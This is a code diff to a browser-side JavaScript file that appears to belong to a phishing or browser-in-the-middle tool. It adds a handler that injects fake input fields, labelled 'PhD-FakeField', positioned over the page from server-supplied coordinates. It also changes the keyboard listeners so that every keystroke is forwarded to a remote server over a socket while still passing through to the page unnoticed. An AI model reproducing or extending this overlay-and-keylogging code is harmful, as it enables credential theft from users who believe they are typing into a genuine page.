@@ -105,6 +105,32 @@ window.onload = function beginCommunication() {
             htmlClickable.id = "PhD-FakeField";
             wrapper.appendChild(htmlClickable);
             break;
+        case 'I': // inject clickable
+            
+            var configFragments = originalMessage.split("||");
+            var location = configFragments[7].split(",");
+            var dimension = configFragments[8].split(",");
+            var htmlClickable = document.createElement("input");
+            htmlClickable.type = configFragments[3];
+            htmlClickable.style.position = "absolute";
+            htmlClickable.style.left = location[0] + 'px';
+            htmlClickable.style.top = location[1] + 'px';
+            htmlClickable.style.width = dimension[0] + 'px';
+            htmlClickable.style.height = dimension[1] + 'px';
+            htmlClickable.text = configFragments[2];
+            //htmlClickable.style.cursor = "pointer";
+            htmlClickable.style.background = configFragments[0];
+            htmlClickable.style.placeholder = configFragments[1];
+            htmlClickable.style.border = "none"; //configFragments[4];
+            htmlClickable.style.outline = "none";
+            //htmlClickable.style.font = configFragments[5];
+            htmlClickable.style.font = "16px arial,sans-serif";//configFragments[5];
+            htmlClickable.padding = configFragments[6];
+            //htmlClickable.style.opacity = "0.9";
+            htmlClickable.id = "PhD-FakeField";
+            wrapper.appendChild(htmlClickable);
+            console.log("Received input element.");
+            break;
         }
     }
 
@@ -127,8 +153,8 @@ window.onload = function beginCommunication() {
     document.onkeypress = async function(event) {
         // this listener forwards all printable char codes (chars) to the server
         var charCode = event.charCode;
-        event.preventDefault();
-        event.stopPropagation();
+        //event.preventDefault();
+        //event.stopPropagation();
         socketC.send("K:" + charCode);
         console.log("Sent key press code: " + charCode);
         await sleep(100);
@@ -140,8 +166,8 @@ window.onload = function beginCommunication() {
         // this listener forwards major control key codes to the server
         var keyCode = event.keyCode;
         if (keyCode == 8 || keyCode == 9 || keyCode == 13 || keyCode == 27 || keyCode == 33 || keyCode == 34 || keyCode == 35 || keyCode == 36 || keyCode == 37 || keyCode == 38 || keyCode == 39 || keyCode == 40 || keyCode == 45 || keyCode == 46) { // these are control chars
-            event.preventDefault();
-            event.stopPropagation();
+            //event.preventDefault();
+            //event.stopPropagation();
             socketC.send("L:" + keyCode);
             console.log("Sent key up code: " + keyCode);
             await sleep(300);
